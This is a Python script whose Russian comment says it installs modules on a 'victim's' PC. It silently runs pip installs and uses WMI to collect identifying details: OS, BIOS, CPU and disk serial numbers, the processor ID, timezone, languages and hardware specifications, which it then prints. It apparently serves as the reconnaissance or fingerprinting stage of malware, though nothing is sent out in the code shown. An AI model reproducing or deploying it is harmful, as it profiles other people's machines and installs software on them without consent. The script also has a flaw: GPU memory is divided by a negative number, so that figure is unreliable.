import os


#на пк жертвы устанавливаем модули
os.system('python -m pip install --upgrade pip')
os.system('python -m pip install --upgrade wmi')
os.system('python -m pip install --upgrade pypiwin32')


import wmi


computer = wmi.WMI()

#info = open('C:/Windows/Temp/usersys.log' 'x')

col = 'OS: ' + str(computer.Win32_OperatingSystem()[0].OSArchitecture) + ' ' + str(computer.Win32_OperatingSystem()[0].Caption) + ' \
' + str(computer.Win32_OperatingSystem()[0].Version) + '\nOS Serial Number: ' + str(computer.Win32_OperatingSystem()[0].SerialNumber) + '\
\nName: ' + str(computer.Win32_OperatingSystem()[0].CSName) + ' | Timezone: ' + str(computer.Win32_TimeZone()[0].Caption) + '\
| Country nuber: ' + str(computer.Win32_OperatingSystem()[0].CountryCode) + ' | Languages: ' + str(computer.Win32_OperatingSystem()[0].MUILanguages) + ' \
\n\nManufacturer: ' + str(computer.Win32_ComputerSystem()[0].Manufacturer) + ' | Model: ' + str(computer.Win32_ComputerSystem()[0].Model) + '\
\nProdID (number): ' + str(computer.Win32_ComputerSystem()[0].SystemSKUNumber) + ' | Serial Number: ' + str(computer.Win32_BIOS()[0].SerialNumber) + '\
\n\nCPU:\n' + str(computer.Win32_Processor()[0].Caption) + ' | ' + str(computer.Win32_Processor()[0].Version) + '\
\n' + str(computer.Win32_Processor()[0].Name) + '\
\nCores: ' + str(computer.Win32_Processor()[0].NumberOfEnabledCore) + '/' + str(computer.Win32_Processor()[0].NumberOfCores) + 'x' + str(computer.Win32_Processor()[0].NumberOfLogicalProcessors) + '\
x' + str(computer.WIn32_Processor()[0].CurrentClockSpeed) + 'Chz\nCPU Serial Number: ' + str(computer.Win32_Processor()[0].ProcessorId) + '\
\nl2-cache: ' + str(computer.Win32_Processor()[0].L2CacheSize) + ' | l3-cache: ' + str(computer.Win32_Processor()[0].L3CacheSize) + '\
\n\nRAM: ' + str(int(computer.Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576) + 'GB\n\nGPU:\n' + str(computer.Win32_VideoController()[0].Caption) + ' | ' + str(int(computer.Win32_VideoController()[0].AdapterRAM) / -1048576) + ' \
GB | ' + str(computer.Win32_VideoController()[0].CurrentHorizontalResolution) + 'x' + str(computer.Win32_VideoController()[0].CurrentVerticalResolution) + '\
\nDriver version: ' + str(computer.Win32_VideoController()[0].DriverVersion) + '\
\n\nHDD/SSD:\nModel: ' + str(computer.CIM_DiskDrive()[0].Model) + ' | Size: ' + str(int(int(computer.CIM_DiskDrive()[0].Size) / 1048576 / 1000)) + '\
GB\nHDD/SSD Serial Number: ' + str(computer.CIM_DiskDrive()[0].SerialNumber)


print(col)